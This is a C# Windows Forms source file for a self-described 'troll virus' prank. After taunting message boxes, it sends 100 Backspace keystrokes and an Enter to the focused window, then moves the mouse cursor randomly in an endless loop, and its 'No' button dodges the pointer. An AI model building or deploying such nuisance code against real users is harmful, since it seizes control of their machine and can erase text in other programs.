using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using System.Drawing;
using System.Media;
using System.Diagnostics;
using System.IO;

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        Random _random = new Random();
        Point _Cursor;
        public Form1()
        {
            InitializeComponent();
            /// Troll virus initiation
            timer1.Start();

        }
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams parms = base.CreateParams;
                parms.ClassStyle |= 0x200;
                return parms;
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            //_Cursor.X = _random.Next(250) - 10;
            //_Cursor.Y = _random.Next(250) - 20;
            //Cursor.Position = _Cursor;
            
        }

        private void Yes_Click(object sender, EventArgs e)
        {
            DialogResult dialog = DialogResult.OK;
            if (dialog == DialogResult.OK)
            {
                MessageBox.Show("I admire your honesty", "lol", MessageBoxButtons.OK, MessageBoxIcon.Information);
                DialogResult ok = DialogResult.OK;
                if (ok == DialogResult.OK)
                {
                    MessageBox.Show("CUZ U STUPID U GET VIRUS ", "MWAHAHAHAHAHA", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    DialogResult newform2 = DialogResult.OK;
                    if(newform2 == DialogResult.OK)
                    {
                        Form2 openform = new Form2();
                        openform.Show();
                        int i = 0;
                        while(i < 100)
                        {
                            SendKeys.SendWait("{BACKSPACE}");
                            i++;
                            Thread.Sleep(100);
                        }
                        if(i > 99)
                        {
                            SendKeys.SendWait("{ENTER}");
                        }
                    }
                    while (true)
                    {
                        _Cursor.X = _random.Next(2000) - 10;
                        _Cursor.Y = _random.Next(2500) - 20;
                        Cursor.Position = _Cursor;
                    }
                }
            }
        }

        private void No_MouseHover(object sender, EventArgs e)
        {
            No.Location = new System.Drawing.Point(_random.Next(100, 100));
            No.Location = new System.Drawing.Point(_random.Next(300, 300));
            No.Location = new System.Drawing.Point(_random.Next(30, 400));
        }
        
        private void No_MouseDown(object sender, MouseEventArgs e)
        {
            components.Remove(No);
        }

        private void No_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Yes.Focus();
        }
    }
}
